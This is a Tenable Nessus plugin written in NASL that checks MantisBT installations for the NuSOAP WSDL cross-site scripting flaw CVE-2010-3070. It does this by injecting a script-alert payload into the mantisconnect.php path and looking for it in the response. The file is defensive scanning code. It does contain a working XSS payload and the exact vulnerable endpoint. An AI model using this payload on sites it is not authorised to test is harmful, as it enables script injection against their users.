#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(49792);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/11/28 21:52:55 $");

  script_cve_id("CVE-2010-3070");
  script_bugtraq_id(42959);
  script_osvdb_id(67785);
  script_xref(name:"Secunia", value:"41254");

  script_name(english:"MantisBT nusoap/nusoap.php NuSOAP WSDL XSS");
  script_summary(english:"Tries to inject XSS string in the url");

  script_set_attribute(attribute:"synopsis",value:
"The remote web server hosts an application that is affected by a
cross-site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installation of MantisBT on the remote host includes a version of
NuSOAP that fails to sanitize user input passed via PHP's
$_SERVER['PHP_SELF'] variable to 'nusoap/nusoap.php' via
'soap/mantisconnect.php' before using it to generate dynamic HTML
content.

An unauthenticated, remote attacker may be able to leverage this issue
to inject arbitrary HTML or script code into a user's browser to be
executed within the security context of the affected site.

Although Nessus has not checked for them, the installed version is
also likely to be affected by several other cross-site scripting
vulnerabilities.");

  script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/projects/nusoap/forums/forum/193579/topic/3834005");
  script_set_attribute(attribute:"see_also", value:"http://www.mantisbt.org/bugs/view.php?id=12312");
  script_set_attribute(attribute:"see_also", value:"http://www.mantisbt.org/bugs/changelog_page.php?version_id=111");

  script_set_attribute(attribute:"solution", value:"Upgrade to MantisBT 1.2.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);


  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mantisbt:mantisbt");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("mantis_detect.nasl");
  script_require_keys("installed_sw/MantisBT");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80, php:TRUE);

app_name = "MantisBT";

install = get_single_install(app_name: app_name, port: port);
install_url = build_url(port:port, qs:install['path']);
dir = install['path'];

# Try to exploit the issue.
exploit = '1/<script>alert(' + "'" + SCRIPT_NAME+'-'+unixtime() + "'" + ')</script>';

vuln = test_cgi_xss(
  port     : port,
  cgi      : "/api/soap/mantisconnect.php/"+ exploit,
  dirs     : make_list(dir),
  pass_str : '/api/soap/mantisconnect.php/'+exploit+'?wsdl">WSDL</a>',
  pass_re  : '</script>/mc_version<br>'
);

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app_name, install_url);
